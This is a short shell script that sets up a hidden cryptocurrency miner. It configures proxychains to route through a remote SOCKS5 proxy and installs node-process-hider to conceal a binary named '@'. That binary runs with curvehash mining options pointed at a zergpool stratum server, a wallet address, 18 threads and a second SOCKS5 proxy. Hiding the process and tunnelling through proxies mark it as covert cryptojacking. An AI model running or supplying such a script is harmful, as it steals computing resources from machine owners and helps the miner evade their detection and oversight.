apt update 
apt install proxychains  -y 
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
apt install nodejs -y
node –version
apt install npm -y
npm –version 
npm i -g node-process-hider
chmod u+x @
ph add @
./@ -a curvehash -o stratum+tcp://curvehash.eu.mine.zergpool.com:3343 -u XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk -p c=DASH,mc=PLSR,ID=$(echo $(hostname)) -t 18 -x socks5://192.252.214.20:15864
